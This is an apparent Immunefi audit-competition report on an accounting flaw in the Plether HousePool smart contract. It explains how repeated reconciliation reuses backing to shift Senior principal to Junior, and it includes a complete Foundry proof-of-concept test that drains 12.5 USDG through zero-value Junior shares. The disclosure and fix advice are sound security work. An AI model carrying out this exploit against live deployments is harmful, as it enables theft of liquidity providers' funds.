# \#98158 [SC-High] Incomplete SC-L1 fix: repeated reconciliation steals Senior principal via zero-value Junior shares

**Submitted on Nov 5th 2026 at 16:28:06 UTC by @joesephdiver for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98158
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief / Introduction

This is an incomplete remediation of SC Audit Studio SC-L1. The frozen fix caps pending claimant credit per reconciliation, but the cap is not idempotent across reconciliations: a later call can reuse the same terminal distributable backing for the residual pending buckets.

After a partially backed recapitalization has already converted all available backing into Senior principal, a second settlement with no new cash, liability, claimant inflow, or mark treats the residual recapitalization and revenue as newly backed. It loss-reconciles the existing Senior principal away, reapplies the residual buckets, lowers Senior's recovery target, and routes current value into Junior.

In the demonstrated state, pass two changes `Senior=50, HWM=80, Junior=0` into `Senior=30, HWM=30, Junior=20`. It then escrows exactly 12.5 USDG for an attacker who acquired canonically zero-value Junior shares after the wipe; the attacker claims the funded withdrawal afterward. No backing arrives between passes.

## Vulnerability Details

The root cause is that `_settleablePendingClaimantBuckets()` caps the current pending buckets against the full terminal `distributable` on every call (`packages/perps/src/HousePool.sol:L1829-L1834`):

```solidity
function _settleablePendingClaimantBuckets(
    HousePoolAccountingLib.ReconcileSnapshot memory reconcileSnapshot,
    HousePoolPendingPreviewLib.ClaimantPendingBuckets memory claimantBuckets
) internal pure returns (HousePoolPendingPreviewLib.ClaimantPendingBuckets memory settleableClaimantBuckets) {
    return HousePoolPendingPreviewLib.capClaimantBuckets(claimantBuckets, reconcileSnapshot.distributable);
}
```

The planner subtracts that supposedly settleable amount from distributable and then reconciles already-stored principal against what remains (`packages/perps/src/libraries/HousePoolReconcilePlanLib.sol:L68-L103`).

After pass one, the selected distributable already backs the newly created Senior principal. Pass two does not account for that. It reserves the residual buckets against the same distributable again, leaves zero backing for the stored principal, and records an artificial loss.

The pending buckets are then reapplied and decremented (`packages/perps/src/HousePool.sol:L1759-L1775`). If the artificial loss reaches zero principal, recapitalization overwrites the Senior HWM using only the current residual intent (`packages/perps/src/libraries/HousePoolPendingPreviewLib.sol:L111-L136`):

```solidity
if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
    state.waterfall.seniorPrincipal += remaining;
    state.waterfall.seniorHighWaterMark =
        recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
    remaining = 0;
}
```

On the later pass, `recapitalizationTargetAssets` is the now-smaller residual bucket, not the original recovery target. The HWM therefore decreases even though no Senior withdrawal occurred.

The exact transition is:

```text
Physical assets        = 100
Trader claims          = 50
Terminal distributable = 50
Pending recap          = 80
Pending revenue        = 20

After pass 1:
Senior principal = 50
Senior HWM       = 80
Junior principal = 0
Pending recap    = 30
Pending revenue  = 20

After pass 2, with no new economic input:
Senior principal = 30
Senior HWM       = 30
Junior principal = 20
Pending recap    = 0
Pending revenue  = 0
```

The same 50 units of backing were selected twice. Senior loses 20 units of current principal to Junior, and its recovery target falls by 50.

`HousePool` reconciles before redemption funding, so the newly created Junior principal is immediately available to the attacker's matured request (`packages/perps/src/HousePool.sol:L824-L941`). A zero-value redemption is made refundable and increments `processedEpochs` without moving cash or burning supply, so `NoLpEpochProgress` does not prevent either committed pass (`packages/perps/src/HousePool.sol:L951-L986`).

## Preconditions and Attack Path

1. An ordinary protocol loss wipes stored tranche principal while Junior shares survive. A matured zero-output redemption request can commit this canonical zero-principal state.
2. The attacker acquires ordinary Junior shares whose canonical protocol value is now zero and submits a full-balance redemption. A holder willing to transfer or sell those shares, and the acquisition price, are market preconditions. A full-balance request remains valid even when its estimate is below the one-USDG partial-request minimum.
3. A legitimate outstanding trader claim remains unpaid. The PoC assigns it to the attacker, who can simply leave its own claim outstanding across the two passes.
4. A legitimate owner recapitalization and ordinary trading revenue arrive while principal is zero. The outstanding claim leaves them only partially backed.
5. The first public LP settlement applies the backed portion to Senior. Junior remains zero, so the attacker's request becomes refundable and commits pass one.
6. The attacker claims the refunded shares, waits the ordinary one-hour cooldown, and requeues the same full balance.
7. With no new cash, liability, claimant inflow, or mark, the next public settlement commits pass two, transfers Senior value into Junior, and funds the attacker's redemption.
8. The attacker claims the funded 12.5 USDG.

The exploit requires a stable economic snapshot across the refund cooldown and the next matured epoch, but no malicious or compromised trusted role. `CfdEngine.recapitalizePool()` is the documented recovery action. Every exploit-triggering settlement, refund, requeue, and withdrawal in the PoC is performed by the unprivileged attacker.

The authenticated setup calls are synthetic fixtures for documented protocol states: a HousePool payout/loss, an unpaid trader claim, and trading revenue. The replay bug consumes only the resulting HousePool/Engine accounting snapshot; omitted trader account credits do not enter that input. Normal settlement mutates the same fields through `HousePool.payOut()` (`packages/perps/src/HousePool.sol:L599-L613`), deferred claim recording (`packages/perps/src/CfdEngine.sol:L837-L859`), and losing-close pledge/action-charge revenue (`packages/perps/src/CfdEngineSettlementSidecar.sol:L604-L623`). None of these authenticated fixture calls is attributed to the attacker.

## Impact Details

This is direct theft of at-rest Senior LP principal, not a view discrepancy. Immediately before replay, all 50 units of terminal distributable are already represented by Senior principal. Pass two reallocates 20 units to Junior and transfers 12.5 physical USDG into the redemption vault for the attacker.

The attacker's acquired shares have zero principal and would receive zero from the unchanged snapshot absent replay. The 12.5-USDG claim is therefore positive incremental value, before gas and acquisition price, taken from already-booked Senior principal; it is not recovery of the attacker's historical LP deposit. Funding occurs in the replay transaction, and the funded withdrawal remains claimable afterward.

At the active `maxSeniorShareBps = 8000`, Senior protected exposure of 30 requires exactly:

```text
30e6 * 2000 / 8000 = 7.5e6 token atoms = 7.5 USDG
```

of Junior backing. The remaining `20 - 7.5 = 12.5` USDG of replay-created Junior principal is immediately withdrawable, which the PoC claims exactly.

The impact scales linearly with live funds. For example, a launch-cap-scale state with 50M physical assets, 25M trader claims, 40M pending recapitalization, and 10M pending revenue produces `Senior=25M/HWM=40M` after pass one, `Senior=15M/Junior=10M` after replay, and 6.25M USDG of immediately withdrawable Junior value under the same 80% covenant.

## Known-Issue / Incomplete-Fix Analysis

SC Audit Studio SC-L1 reported that pending claimant buckets were credited without liability-adjusted caps. Its remediation states that unbacked value must remain pending and reserved until it becomes backed. The current per-call cap implements only part of that fix: across calls, it reuses identical backing and consumes the residual without new value. The frozen SC-L1 remediation is therefore incomplete, which the competition rules expressly permit reporting.

Cecuro MED-12 concerns same-pass revenue continuation after recapitalization, not cross-call backing reuse. MED-24 and `SECURITY.md` disclose that zero-payout epochs consume bounded work; that behavior is only the progress mechanism here. MED-11/LOW-54 concern HWM rounding during actual Senior withdrawals, whereas this HWM falls without a Senior withdrawal. Cecuro MED-1 concerns stale-mark reserve release through owner rate finalization; this report uses an unchanged Engine snapshot in a no-open-position regime where mark freshness is not required, plus permissionless LP settlement.

Total principal never exceeds terminal NAV in this PoC. The incomplete fix instead changes tranche ownership, destroys Senior recovery priority, and enables a real cash withdrawal.

## Recommended Fix

Make pending claimant settlement idempotent against value already represented by stored principal and unassigned assets. Residual buckets should become settleable only when terminal distributable increases beyond backing assigned by earlier passes. Preserve the original recapitalization target for a partially applied recap intent rather than replacing it with the residual amount.

Add a regression invariant: after a partial claimant pass, with the same Engine snapshot and supplies and no new cash, liability, or claimant inflow, the next reconcile must not consume residual pending buckets or alter principal, HWM, or unassigned assets.

## References

- Frozen commit: `a82d4fefb02768e5b3bddcc97dee371eee24fea8`
- Primary asset: `packages/perps/src/HousePool.sol`
- Accounting specification: `packages/perps/ACCOUNTING_SPEC.md`


## Proof of Concept

## Proof of Concept

The PoC runs against the frozen repository without modifying any in-scope contract. It uses the active 40M/80% Senior covenant, an authenticated `HousePool.payOut()` loss fixture, the real owner-funded `engine.recapitalizePool()` path, authenticated Engine claim/revenue fixtures, and only unprivileged calls for both claimant reconciliations and the final withdrawal.

Unlike a sunk-capital recovery scenario, the attacker acquires ordinary Junior shares only after their canonical value is zero. Pass one refunds those worthless shares; after the standard cooldown, pass two funds exactly 12.5 USDG of positive incremental value.

### Run command

Save the test file below, then run from `packages/perps`:

```bash
forge test --offline \
  --match-path test/audit/PendingRecapitalizationReplay.t.sol \
  --match-test test_ReplayedMixedBucketsMakeWipedJuniorSharesImmediatelyWithdrawable -vv
```

Expected result with Foundry 1.5.1:

```text
[PASS] test_ReplayedMixedBucketsMakeWipedJuniorSharesImmediatelyWithdrawable()
1 passed; 0 failed
gas: 2,696,135
```

The same command also passes with Foundry 1.8.1.

### Test file

Save as `test/audit/PendingRecapitalizationReplay.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolTestBase} from "../perps/shared/HousePoolTestBase.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";

/// @dev Audit PoC: repeated fresh reconciliation can consume residual claimant intent against
///      the same distributable equity and transfer already-booked Senior value to Junior.
contract PendingRecapitalizationReplayPoC is HousePoolTestBase {

    function test_ReplayedMixedBucketsMakeWipedJuniorSharesImmediatelyWithdrawable() public {
        // Match the active release's 40M absolute / 80% ratio Senior covenant.
        _setSeniorCapacity(40_000_000e6, 8000);

        // Alice is an ordinary Junior LP. Her positive-value request supplies legitimate queue
        // progress when a later protocol loss wipes principal. Bob is not yet an LP.
        _fundJunior(alice, 10_000e6);
        _finishAsyncCooldown(juniorVault, alice);

        uint256 progressShares = juniorVault.maxRequestRedeem(alice) / 100;
        assertGe(juniorVault.estimateRedeemAssets(progressShares), 1e6, "request satisfies the public minimum");
        (uint256 wipeEpoch,) = juniorVault.getRequestEpochWindow();
        assertEq(_requestAsyncRedeem(juniorVault, alice, progressShares), wipeEpoch);

        // Use an authenticated HousePool payout to model the canonical pool-loss condition.
        // Bob, an unprivileged address, commits the resulting wipe through public LP settlement.
        vm.warp(pool.lpEpochStart(wipeEpoch));
        uint256 lossAssets = pool.rawAssets();
        vm.prank(address(engine.settlementSidecar()));
        pool.payOut(address(clearinghouse), lossAssets);
        vm.prank(bob);
        pool.settleLpEpoch(0, 0);
        assertEq(pool.seniorPrincipal() + pool.juniorPrincipal(), 0);

        // Bob can now acquire ordinary Junior shares whose canonical value is zero. A full-balance
        // redemption remains requestable at zero value and does not rely on a Sybil identity.
        uint256 worthlessShares = juniorVault.maxRequestRedeem(alice);
        vm.prank(alice);
        juniorVault.transfer(bob, worthlessShares);
        assertEq(juniorVault.estimateRedeemAssets(worthlessShares), 0);
        (uint256 firstPassEpoch,) = juniorVault.getRequestEpochWindow();
        assertEq(_requestAsyncRedeem(juniorVault, bob, worthlessShares), firstPassEpoch);

        // Install an authenticated flat-account claim while the empty pool cannot pay it. A normal
        // profitable close can create this claim; assigning it to Bob lets the attacker keep it
        // outstanding across the two reconciliations without relying on any other party's inaction.
        vm.prank(address(engine.settlementSidecar()));
        engine.settlementRecordTraderClaim(bob, 50e6, false);

        // Use the real owner-funded recapitalization path: 80 recap + 20 ordinary trading revenue,
        // with 50 of outstanding trader claims, leaves terminal distributable of 50.
        settlementToken.mint(address(this), 80e6);
        settlementToken.approve(address(engine), 80e6);
        engine.recapitalizePool(80e6);
        settlementToken.mint(address(pool), 20e6);
        vm.prank(address(engine));
        pool.recordClaimantInflow(
            20e6, IHousePool.ClaimantInflowKind.Revenue, IHousePool.ClaimantInflowCashMode.CashArrived
        );
        assertEq(engine.traderClaimBalanceAssets(bob), 50e6);
        assertEq(engine.totalTraderClaimBalanceAssets(), 50e6);

        // Pass one correctly applies only the backed recap amount. Junior remains zero, so Bob's
        // full-balance request is refunded and supplies the required committed queue progress.
        vm.warp(pool.lpEpochStart(firstPassEpoch));
        vm.prank(bob);
        IHousePool.LpEpochSettlementResult memory firstPass = pool.settleLpEpoch(0, 0);
        assertEq(firstPass.juniorProcessedEpochs, 1);
        assertEq(pool.seniorPrincipal(), 50e6);
        assertEq(pool.seniorHighWaterMark(), 80e6);
        assertEq(pool.juniorPrincipal(), 0);
        assertEq(pool.pendingRecapitalizationAssets(), 30e6);
        assertEq(pool.pendingTradingRevenueAssets(), 20e6);
        assertEq(pool.getFreeAssets(), 0);

        vm.prank(bob);
        uint256 refundedShares = juniorVault.claimRedeemRefund(firstPassEpoch, bob, bob);
        assertEq(refundedShares, worthlessShares);

        uint256 physicalAssetsBeforeReplay = pool.rawAssets();
        uint256 accountedAssetsBeforeReplay = pool.accountedAssets();
        uint256 claimsBeforeReplay = engine.totalTraderClaimBalanceAssets();
        uint256 markPriceBeforeReplay = engine.lastMarkPrice();
        uint64 markTimeBeforeReplay = engine.lastMarkTime();

        // A refund starts the ordinary one-hour cooldown. Bob waits, then requeues the same full
        // balance. No cash, liability, mark, or claimant inflow changes between the two passes.
        _finishAsyncCooldown(juniorVault, bob);
        (uint256 replayEpoch,) = juniorVault.getRequestEpochWindow();
        assertGt(replayEpoch, firstPassEpoch);
        assertEq(_requestAsyncRedeem(juniorVault, bob, juniorVault.maxRequestRedeem(bob)), replayEpoch);
        vm.warp(pool.lpEpochStart(replayEpoch));

        assertEq(pool.rawAssets(), physicalAssetsBeforeReplay, "no backing arrived between passes");
        assertEq(pool.accountedAssets(), accountedAssetsBeforeReplay, "accounted cash is unchanged");
        assertEq(engine.totalTraderClaimBalanceAssets(), claimsBeforeReplay, "claims are unchanged");
        assertEq(engine.lastMarkPrice(), markPriceBeforeReplay, "mark price is unchanged");
        assertEq(engine.lastMarkTime(), markTimeBeforeReplay, "mark time is unchanged");

        // Pass two reuses the same 50 distributable, wipes booked Senior 50, reapplies the residual
        // recap 30, routes revenue 20 to Junior, and escrows exactly 12.5 for Bob's withdrawal.
        uint256 bobAssetsBefore = settlementToken.balanceOf(bob);
        vm.prank(bob);
        IHousePool.LpEpochSettlementResult memory replay = pool.settleLpEpoch(0, 0);
        assertEq(pool.seniorPrincipal(), 30e6);
        assertEq(pool.seniorHighWaterMark(), 30e6);
        assertEq(pool.pendingRecapitalizationAssets(), 0);
        assertEq(pool.pendingTradingRevenueAssets(), 0);
        assertEq(replay.juniorFundedAssets, 12_500_000);
        assertEq(pool.rawAssets() + replay.juniorFundedAssets, physicalAssetsBeforeReplay);

        (, uint256 claimedAssets) = _claimAsyncRedeem(juniorVault, replayEpoch, bob);
        assertEq(claimedAssets, replay.juniorFundedAssets);
        assertEq(settlementToken.balanceOf(bob) - bobAssetsBefore, claimedAssets);
        assertEq(engine.traderClaimBalanceAssets(bob), 50e6, "the separate claim remains outstanding");
    }
}
```

### What the assertions prove

1. The PoC matches the active 40M absolute / 80% ratio Senior covenant.
2. Bob is unprivileged for every `settleLpEpoch()` call and uses one identity throughout the exploit.
3. Bob acquires Junior shares only after their canonical value is zero, so the 12.5-USDG withdrawal is positive incremental value.
4. Pass one correctly preserves the original 80-USDG recovery target and leaves the unbacked claimant residual pending.
5. Between pass one and pass two, raw cash, accounted cash, trader claims, mark price, and mark time are unchanged.
6. Pass two nevertheless lowers Senior principal and HWM, creates Junior principal, consumes both residual buckets, and removes exactly 12.5 USDG from the pool.
7. The funded vault escrow is claimed through the production asynchronous redemption path, while the separate 50-USDG trader claim remains outstanding.

The `vm.prank` calls for `HousePool.payOut`, `settlementRecordTraderClaim`, and `recordClaimantInflow` create synthetic authenticated fixtures for the HousePool/Engine snapshot fields used by documented settlement states. They are not attacker actions, and omitted trader account credits do not enter the replayed HousePool snapshot. The attacker-triggered reconciliation, refund, requeue, funding, and withdrawal paths are public. Mock USDG minting supplies the documented owner recapitalization and trading-revenue cash in the test environment.

